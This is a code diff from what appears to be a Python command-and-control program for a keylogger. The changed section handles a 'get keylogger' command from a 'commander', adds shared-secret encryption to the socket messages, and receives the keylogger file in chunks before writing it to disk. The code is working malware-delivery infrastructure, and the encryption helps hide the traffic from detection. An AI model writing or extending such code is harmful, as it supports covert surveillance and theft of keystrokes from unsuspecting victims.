@@ -106,28 +106,33 @@ if __name__ == '__main__':
                                                                     .format(file_name), shared_secret).encode())
 
 # b) Command to GET keylog program from commander
-                if data.decode() == constants.GET_KEYLOGGER_MSG:
+                if decrypted_data == constants.GET_KEYLOGGER_MSG:
                     print(constants.CLIENT_RESPONSE.format(constants.GET_KEYLOGGER_MSG))
 
                     # Send an initial acknowledgement to the client (giving them green light for transfer)
-                    client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
+                    client_socket.send(encrypt_string(constants.RECEIVED_CONFIRMATION_MSG, shared_secret).encode())
 
                     # Call to receive the file data and checksum from the client
-                    filename = client_socket.recv(1024).decode()
+                    filename = decrypt_string(client_socket.recv(1024).decode(), shared_secret)
                     print(constants.RECEIVING_FILE_MSG.format(filename))
 
-                    with open(filename, constants.WRITE_BINARY_MODE) as file:
-                        eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker
+                    # Loop to receive the entire keylogger file data
+                    encrypted_data = b""
+                    eof_marker = constants.FILE_END_OF_FILE_SIGNAL
+                    while True:
+                        chunk = client_socket.recv(1024)
+                        if not chunk:
+                            break  # No more data received
+                        if chunk.endswith(eof_marker):
+                            encrypted_data += chunk[:-len(eof_marker)]  # Exclude the end-of-file marker
+                            break
+                        encrypted_data += chunk
 
-                        while True:
-                            file_data = client_socket.recv(1024)
-                            if not file_data:
-                                break  # No more data received
-                            if file_data.endswith(eof_marker):
-                                file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
-                                break
-                            else:
-                                file.write(file_data)
+                    # Decrypt and write to file
+                    decrypted_data = decrypt(encrypted_data, shared_secret)
+
+                    with open(filename, constants.WRITE_BINARY_MODE) as file:
+                        file.write(decrypted_data)
 
                     # Send ACK to commander (if good)
                     if is_file_openable(filename):
